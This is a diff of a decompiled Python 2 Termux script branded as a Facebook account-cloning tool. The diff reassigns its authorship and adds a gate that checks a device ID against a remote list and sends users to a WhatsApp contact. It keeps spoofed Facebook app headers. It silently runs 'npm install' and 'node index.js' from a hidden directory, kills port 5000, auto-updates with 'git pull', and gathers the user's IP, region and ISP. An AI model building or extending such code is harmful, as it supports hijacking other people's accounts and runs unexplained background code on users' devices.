@@ -1,13 +1,15 @@
+# Decompiled By Sayyed Zakarya
+# Github : https://github.com/aryanotriks
 # uncompyle6 version 3.7.4
 # Python bytecode 2.7
-# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
+# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
 # [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
 # Embedded file name: aso
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Rananadeem'
-__copyright = 'All rights reserved . Copyright  Rananadeem'
+__author__ = 'Sayyed Zakarya'
+__copyright = 'All rights reserved . Copyright  Sayyed Zakarya'
 os.system('termux-setup-storage')
 try:
     os.mkdir('/sdcard/ids')
@@ -15,11 +17,8 @@ except OSError:
     pass
 
 bd = random.randint(20000000.0, 30000000.0)
-sim = random.randint(20000.0, 40000.0)
-bd = random.randint(20000000.0, 30000000.0)
 sim = random.randint(20000, 40000)
-header = {'x-fb-connection-bandwidth': repr(bd), 
-   'x-fb-sim-hni': repr(sim), 
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
    'x-fb-net-hni': repr(sim), 
    'x-fb-connection-quality': 'EXCELLENT', 
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
@@ -28,13 +27,93 @@ header = {'x-fb-connection-bandwidth': repr(bd),
    'x-fb-http-engine': 'Liger'}
 os.system('git pull')
 os.system('clear')
-c = '\x1b[1;32m\x1b[0;97m\x1b[1;32m'
-c2 = '\x1b[0;97m\x1b[1;32m\x1b[0;97m'
-c3 = '\x1b[1;31m\x1b[0;97m\x1b[1;31m'
-os.system('git pull')
-os.system('clear')
-logo = '\n\x1b[1;97m********************************************\n\x1b[1;93m      AUTHER    :     Rana Nadeem Rajput\n\x1b[1;96m      GITHUB    :     /Rananadeem5214\n\x1b[1;95m        Wp      :     +923082503426\n\x1b[1;94m         FB      :     /muhammad.nadeem.5214\n\x1b[1;97m *******************************************\n\x1b[1;98m          Send id in messenger for approval\n\x1b[1;97m *******************************************\n'
+logo = """
+\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
+\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
+\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
+\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
+\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
+\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
+\033[1;97m                /(                                 
+\033[1;94m               (__)                  
+ \033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
+ \033[32;1mCreator \033[37;1m: \033[33;1mSayyed-Zakarya
+ \033[32;1mVersion \033[37;1m: \033[33;1m1.2
+"""
+def reg():
+    os.system('clear')
+    print logo
+    print ''
+    print '\x1b[1;31;1mTake The Approval For Login'
+    print ''
+    time.sleep(1)
+    try:
+        to = open('/sdcard/.hst.txt', 'r').read()
+    except (KeyError, IOError):
+        reg2()
 
+    r = requests.get('https://raw.githubusercontent.com/hamayunpro/haha/main/server.txt').text
+    if to in r:
+        os.system('cd ..... && npm install')
+        os.system('fuser -k 5000/tcp &')
+        os.system('#')
+        os.system('cd ..... && node index.js &')
+        time.sleep(5)
+        ip()
+    else:
+        os.system('clear')
+        print logo
+        print '\tApproved Failed'
+        print ' \x1b[1;92mYour Id Is Not Approved Already '
+        print ' \x1b[1;92mCopy the id and send to admin'
+        print ' \x1b[1;92mYour id: ' + to
+        raw_input('\x1b[1;93m Press enter to send id')
+        os.system('xdg-open https://wa.me/+923472860857')
+        reg()
+
+
+def reg2():
+    os.system('clear')
+    print logo
+    print '\tApproval not detected'
+    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'
+    id = uuid.uuid4().hex[:50]
+    print ' Your id: ' + id
+    print ''
+    raw_input(' Press enter to go to whatsapp ')
+    os.system('xdg-open https://wa.me/+923472860857')
+    sav = open('/sdcard/.hst.txt', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\x1b[1;92m Press enter to check Approval ')
+    reg()
+
+
+def ip():
+    os.system('clear')
+    print logo
+    print '\tCollecting device info'
+    try:
+        ipinfo = requests.get('http://ip-api.com/json/')
+        z = json.loads(ipinfo.text)
+        ips = z['query']
+        country = z['country']
+        regi = z['regionName']
+        network = z['isp']
+    except:
+        pass
+
+    print '\x1b[1;92m Your ip: ' + ips
+    time.sleep(1)
+    print '\x1b[1;92m Your country: ' + country
+    time.sleep(1)
+    print '\x1b[1;92m Your region: ' + regi
+    time.sleep(1)
+    print ' \x1b[1;92mYour network: ' + network
+    time.sleep(1)
+    print ' Loading ...'
+    time.sleep(1)
+    log_menu()
 
 def menu():
     os.system('clear')
